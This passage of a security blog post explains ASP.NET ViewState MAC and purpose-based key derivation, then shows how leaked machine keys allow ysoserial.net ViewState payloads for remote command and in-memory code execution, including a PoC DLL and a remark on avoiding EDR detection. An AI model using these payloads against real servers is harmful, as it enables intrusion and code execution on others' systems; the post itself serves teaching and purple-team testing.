+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_page&lt;/span> &lt;span class="p">!=&lt;/span> &lt;span class="kc">null&lt;/span> &lt;span class="p">&amp;amp;&amp;amp;&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">EnableViewStateMac&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">||&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_macKeyBytes&lt;/span> &lt;span class="p">!=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">array&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">MachineKeySection&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetDecodedData&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetMacKeyModifier&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="m">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">num&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">ref&lt;/span> &lt;span class="n">num&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">catch&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PerfCounters&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">IncrementCounter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">AppPerfCounter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">VIEWSTATE_MAC_FAIL&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ViewStateException&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ThrowMacValidationError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">inputString&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">object&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">MemoryStream&lt;/span> &lt;span class="n">memoryStream&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">ObjectStateFormatter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetMemoryStream&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">memoryStream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="m">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">num&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">memoryStream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Position&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="m">0L&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Deserialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">memoryStream&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">finally&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ObjectStateFormatter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ReleaseMemoryStream&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">memoryStream&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The first conditional expression inside try (line 11) is where the .NET compability mode is verified. In .NET Framework 4.5 and later, the machine key system incorporates the concept of a &lt;strong>purpose&lt;/strong>. This means keys are derived differently for each application, using factors such as:&lt;/p>
+&lt;ul>
+&lt;li>The application’s virtual path (&lt;code>TemplateSourceDirectory&lt;/code>).&lt;/li>
+&lt;li>The page type.&lt;/li>
+&lt;li>The &lt;code>ViewStateUserKey&lt;/code> (if present).&lt;/li>
+&lt;/ul>
+&lt;p>This makes the key derivation unique per app and improves isolation. Below, the code of &lt;code>GetSpecificPurposes&lt;/code> function:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-C#" data-lang="C#">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">internal&lt;/span> &lt;span class="n">List&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">GetSpecificPurposes&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_specificPurposes&lt;/span> &lt;span class="p">==&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_page&lt;/span> &lt;span class="p">==&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">List&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">list&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">List&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;TemplateSourceDirectory: &amp;#34;&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">TemplateSourceDirectory&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ToUpperInvariant&lt;/span>&lt;span class="p">(),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;Type: &amp;#34;&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetType&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ToUpperInvariant&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ViewStateUserKey&lt;/span> &lt;span class="p">!=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">list&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ViewStateUserKey: &amp;#34;&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ViewStateUserKey&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_specificPurposes&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_specificPurposes&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>If the conditional fails, it will handle the encryption in the &amp;ldquo;legacy&amp;rdquo; (prior to .NET Framework 4.5) way, where there is no purpose. Encryption (if present) and MAC validation will be processed respectively.&lt;/p>
+&lt;p>I hope I have clarified the role of machine keys in the context of view state exploitation.&lt;/p>
+&lt;p>Let&amp;rsquo;s jump to the fun phase (👉ﾟヮﾟ)👉&lt;/p>
+&lt;h2 id="attacking-view-state">Attacking View State
+&lt;/h2>&lt;p>Returning to the purple team scenario, the &lt;code>web.config&lt;/code> file has been leaked, exposing the machine keys. This is not an uncommon scenario. In &lt;a class="link" href="https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/" target="_blank" rel="noopener"
+>this post&lt;/a> of Microsoft Security Inteligence team, more then 3k of these keys were found publicly available.&lt;/p>
+&lt;p>The critical risk emerges from the inherent vulnerabilities in the .NET functions responsible for deserialization. Microsoft warns against this in their &lt;a class="link" href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide" target="_blank" rel="noopener"
+>documentation&lt;/a>:&lt;/p>
+&lt;p>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img13.png"
+width="731"
+height="507"
+srcset="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img13_hu41fd0daf26aba6c3af8a1c41ff49a7ae_44757_480x0_resize_box_3.png 480w, https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img13_hu41fd0daf26aba6c3af8a1c41ff49a7ae_44757_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="figure 13 - Microsoft Security Guide "
+class="gallery-image"
+data-flex-grow="144"
+data-flex-basis="346px"
+>&lt;/p>
+&lt;p>Once the attacker have the keys to encrypt and/or sign the view state, every object within this forged view state will be instantiated during the deserialization process on the server.&lt;/p>
+&lt;p>To exploit this design, Soroush Dalili (@irsdl) created a plugin called &amp;ldquo;viewstate&amp;rdquo; for &lt;a class="link" href="https://github.com/pwntester/ysoserial.net.git" target="_blank" rel="noopener"
+>ysoserial.net&lt;/a>. This tool generates a gadget chain to exploit the instantiation of the object, making possible code execution. It&amp;rsquo;s creators presented this subject at defcon and delve deep into this process: &lt;a class="link" href="https://www.youtube.com/watch?v=ZBfBYoK_Wr0" target="_blank" rel="noopener"
+>https://www.youtube.com/watch?v=ZBfBYoK_Wr0&lt;/a>&lt;/p>
+&lt;h4 id="command-execution">Command Execution
+&lt;/h4>&lt;p>To first explore this scenario, let&amp;rsquo;s run a simple command. The syntax of ysoserial we will be using is the following:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &amp;#34;&amp;lt;COMMAND&amp;gt;&amp;#34; --path=&amp;#34;/&amp;#34; --apppath=&amp;#34;/&amp;#34; --validationalg=&amp;#34;&amp;lt;Validation_algorithm&amp;gt;&amp;#34; --validationkey=&amp;#34;&amp;lt;validation_key_value&amp;gt;&amp;#34; --decryptionalg=&amp;#34;&amp;lt;decryption_algorithm&amp;gt;&amp;#34; --decryptionkey=&amp;#34;&amp;lt;decryption_key_value&amp;gt;&amp;#34; --isdebug
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>-p&lt;/code> indicates the plugin.&lt;/li>
+&lt;li>&lt;code>-g&lt;/code> gadget chain being used.&lt;/li>
+&lt;li>&lt;code>-c&lt;/code> command to run.&lt;/li>
+&lt;li>&lt;code>--path&lt;/code> path of the page being attacked. In this case &amp;ldquo;/&amp;rdquo;, in other cases could be &amp;ldquo;/account/login.aspx&amp;rdquo;.&lt;/li>
+&lt;li>&lt;code>--apppath&lt;/code> the webroot of the application we are targeting.&lt;/li>
+&lt;li>&lt;code>--validationalg&lt;/code> algorithm of the valitation key.&lt;/li>
+&lt;li>&lt;code>--validationkey&lt;/code> actual value of the validation key.&lt;/li>
+&lt;li>&lt;code>--decryptionalg&lt;/code> algorithm of the decryption key.&lt;/li>
+&lt;li>&lt;code>--decryptionkey&lt;/code> actual value of the decryption key.&lt;/li>
+&lt;/ul>
+&lt;p>Demo:&lt;/p>
+&lt;div class="video-wrapper">
+&lt;iframe loading="lazy"
+src="https://www.youtube.com/embed/5caRXssA2go"
+allowfullscreen
+title="YouTube Video"
+>
+&lt;/iframe>
+&lt;/div>
+&lt;p>Naturally you might be wondering about the scenarios where the keys are set to be auto-generated. In this case Soroush Dalili (@irsdl) comes to rescue again! By uploading this aspx code to the application, the automatically generated keys will be shown: &lt;a class="link" href="https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab" target="_blank" rel="noopener"
+>https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab&lt;/a>&lt;/p>
+&lt;h4 id="code-execution">Code Execution
+&lt;/h4>&lt;p>Command execution should suffice to exploit the application. But if some EDR is in place, probably this type of payload will be detected and prevented.&lt;/p>
+&lt;p>To circumvent this inconvenience, it is possible to execute code directly in memory and don&amp;rsquo;t spawn a cmd.exe from w3wp.exe (highly suspicious).&lt;/p>
+&lt;p>First, let&amp;rsquo;s create our dll (.NET Framework). This is the code that will run:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-C#" data-lang="C#">&lt;span class="line">&lt;span class="cl">&lt;span class="k">using&lt;/span> &lt;span class="nn">System.Diagnostics&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">namespace&lt;/span> &lt;span class="nn">PoC&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">internal&lt;/span> &lt;span class="k">class&lt;/span> &lt;span class="nc">Program&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">Program&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Process&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Start&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;cmd.exe&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;/c tasklist.exe &amp;gt; C:\\Users\\Public\\Hacked.txt&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Of course this is just a PoC code and do not remain in memory. Weaponization is let to the reader (see the references section).&lt;/p>
+&lt;p>With this compiled dll we can use ysoserial again to build the payloads. Fist, is necessary to use the gadget ActivitySurrogateDisableTypeCheck to disable type protections for ActivitySurrogateSelector.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">.\ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck -c &amp;#34;ignore&amp;#34; --path=&amp;#34;/&amp;#34; --apppath=&amp;#34;/&amp;#34; --validationalg=&amp;#34;&amp;lt;Validation_algorithm&amp;gt;&amp;#34; --validationkey=&amp;#34;&amp;lt;validation_key_value&amp;gt;&amp;#34; --decryptionalg=&amp;#34;&amp;lt;decryption_algorithm&amp;gt;&amp;#34; --decryptionkey=&amp;#34;&amp;lt;decryption_key_value&amp;gt;&amp;#34; --isdebug
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Now we&amp;rsquo;ll be using the ActivitySurrogateSelectorFromFile gadget to generate our payload based on our compiled dll.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &amp;#34;&amp;lt;path/to/the/.dll&amp;gt;&amp;#34; --path=&amp;#34;/&amp;#34; --apppath=&amp;#34;/&amp;#34; --validationalg=&amp;#34;&amp;lt;Validation_algorithm&amp;gt;&amp;#34; --validationkey=&amp;#34;&amp;lt;validation_key_value&amp;gt;&amp;#34; --decryptionalg=&amp;#34;&amp;lt;decryption_algorithm&amp;gt;&amp;#34; --decryptionkey=&amp;#34;&amp;lt;decryption_key_value&amp;gt;&amp;#34; --isdebug
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Upon execution you will notice a new &amp;ldquo;Hacked.txt&amp;rdquo; file in public user home. (～￣▽￣)～&lt;/p>
+&lt;h2 id="conclusion">Conclusion
+&lt;/h2>&lt;p>There are additional intricacies involved in this exploitation, such as the .NET version in use or the presence of the &lt;strong>ViewStateUserKey&lt;/strong> (you might have noticed in &lt;em>GetSpecificPurposes&lt;/em> method). Since several excellent blog posts already cover these aspects in depth, I won’t attempt to replicate them here. Instead, I’ll include those sources in the references for readers who want to dive deeper.&lt;/p>
+&lt;p>Well, that&amp;rsquo;s it. I hope you have enjoyed 😁&lt;/p>
+&lt;p>If you notice any misconceptions, errors, or inaccuracies, feel free to reach out to me through the social links in the sidebar.&lt;/p>
+&lt;p>Thank you very much, till next time ^^&lt;/p>
+&lt;h2 id="references">References
+&lt;/h2>&lt;p>&lt;strong>Microsoft Documentation&lt;/strong>&lt;/p>
+&lt;p>&lt;a class="link" href="https://learn.microsoft.com/en-us/aspnet/web-forms/overview/moving-to-aspnet-20/server-controls" target="_blank" rel="noopener"
+>https://learn.microsoft.com/en-us/aspnet/web-forms/overview/moving-to-aspnet-20/server-controls&lt;/a>
+&lt;a class="link" href="https://learn.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeysection.validationkey?view=netframework-4.8.1&amp;amp;redirectedfrom=MSDN#System_Web_Configuration_MachineKeySection_ValidationKey" target="_blank" rel="noopener"
+>https://learn.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeysection.validationkey?view=netframework-4.8.1&amp;redirectedfrom=MSDN#System_Web_Configuration_MachineKeySection_ValidationKey&lt;/a>
+&lt;a class="link" href="https://devblogs.microsoft.com/dotnet/farewell-enableviewstatemac/" target="_blank" rel="noopener"
+>https://devblogs.microsoft.com/dotnet/farewell-enableviewstatemac/&lt;/a>
+&lt;a class="link" href="https://learn.microsoft.com/en-us/aspnet/web-forms/overview/moving-to-aspnet-20/server-controls" target="_blank" rel="noopener"
+>https://learn.microsoft.com/en-us/aspnet/web-forms/overview/moving-to-aspnet-20/server-controls&lt;/a>
+&lt;a class="link" href="https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/" target="_blank" rel="noopener"
+>https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/&lt;/a>
+&lt;a class="link" href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide" target="_blank" rel="noopener"
+>https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide&lt;/a>
+&lt;a class="link" href="https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/ms972976%5c%28v=msdn.10%5c%29" target="_blank" rel="noopener"
+>Understanding ASP.NET View State | Microsoft Learn&lt;/a>&lt;/p>
+&lt;p>&lt;strong>Exploitation&lt;/strong>&lt;/p>
+&lt;p>&lt;a class="link" href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener"
+>https://github.com/pwntester/ysoserial.net&lt;/a>
+&lt;a class="link" href="https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/" target="_blank" rel="noopener"
+>https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/&lt;/a>
+&lt;a class="link" href="https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817" target="_blank" rel="noopener"
+>https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817&lt;/a>
+&lt;a class="link" href="https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/" target="_blank" rel="noopener"
+>https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/&lt;/a>
+&lt;a class="link" href="https://blog.blacklanternsecurity.com/p/aspnet-cryptography-for-pentesters" target="_blank" rel="noopener"
+>https://blog.blacklanternsecurity.com/p/aspnet-cryptography-for-pentesters&lt;/a>
+&lt;a class="link" href="https://rivers.chaitin.cn/blog/cq954lh0lnechd244ou0" target="_blank" rel="noopener"
+>https://rivers.chaitin.cn/blog/cq954lh0lnechd244ou0&lt;/a>&lt;/p>
+&lt;p>&lt;strong>Source code&lt;/strong>&lt;/p>
+&lt;p>&lt;a class="link" href="https://github.com/microsoft/referencesource/blob/main/System.Web/UI/ObjectStateFormatter.cs" target="_blank" rel="noopener"
+>https://github.com/microsoft/referencesource/blob/main/System.Web/UI/ObjectStateFormatter.cs&lt;/a>&lt;/p></description></item></channel></rss>
